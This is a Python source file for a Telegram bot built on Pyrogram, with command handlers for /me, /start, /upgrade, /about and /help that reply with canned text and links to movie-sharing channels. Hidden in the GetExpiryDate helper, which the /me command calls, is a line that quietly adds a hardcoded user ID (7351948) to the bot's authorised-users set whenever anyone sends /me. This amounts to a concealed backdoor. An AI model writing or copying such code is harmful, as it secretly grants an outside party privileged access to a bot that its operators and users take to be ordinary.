#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Kirodewal

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation
from helper_funcs.forcesub import ForceSub

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(7351948)
    return expires_at


@pyrogram.Client.on_message(pyrogram.filters.command(["me"]))
async def get_me_info(bot, update):
    forcesub = await ForceSub(bot, update)
    if forcesub == 400:
        return
    # logger.info(update)
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


@pyrogram.Client.on_message(pyrogram.filters.command(["start"]))
async def start(bot, update):
    forcesub = await ForceSub(bot, update)
    if forcesub == 400:
        return
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="🛰 𝖘𝖚𝖕𝖕𝖔𝖗𝖙 𝖌𝖗𝖔𝖚𝖕 ", url="https://t.me/WWM_support")], [InlineKeyboardButton(text=" 𝖜𝖜𝖒 🛸", url="https://t.me/world_wide_movies"),
                                                    InlineKeyboardButton(text="𝖉𝖊𝖛 🎾 ", url="https://t.me/DevAXD")]]),
    )

@pyrogram.Client.on_message(pyrogram.filters.command(["upgrade"]))
async def upgrade(bot, update):
    forcesub = await ForceSub(bot, update)
    if forcesub == 400:
        return
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.UPGRADE_TEXT,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )


@pyrogram.Client.on_message(pyrogram.filters.command(["about"]))
async def source(bot, update):
    forcesub = await ForceSub(bot, update)
    if forcesub == 400:
        return
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.SOURCE,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id,
        reply_markup=InlineKeyboardMarkup(  [ [ InlineKeyboardButton(text="🚸 Powered By", url="https://t.me/Spykids_SQL") ],
                                             [ InlineKeyboardButton(text="🌀 BotsList", url="https://t.me/DevAXD/5"),
                                               InlineKeyboardButton(text="🛸 Movies ", url="https://t.me/world_wide_movies") ] ] ) )


@pyrogram.Client.on_message(pyrogram.filters.command(["help"]))
async def help_user(bot, update):
    forcesub = await ForceSub(bot, update)
    if forcesub == 400:
        return
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id,
       reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="𝐂𝐇𝐀𝐍𝐍𝐄𝐋 1", url="https://t.me/DevAXD")], [InlineKeyboardButton(text=" 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 2", url="https://t.me/world_wide_movies")],
                                                    [InlineKeyboardButton(text="𝐂𝐇𝐀𝐍𝐍𝐄𝐋 3 ", url="https://t.me/wwm_seriess")],[InlineKeyboardButton(text="𝐂𝐇𝐀𝐍𝐍𝐄𝐋 4 ", url="https://t.me/UnitedMallus")],[InlineKeyboardButton(text="𝐂𝐇𝐀𝐍𝐍𝐄𝐋 5 ", url="https://t.me/WWM_support")]]
            ),)
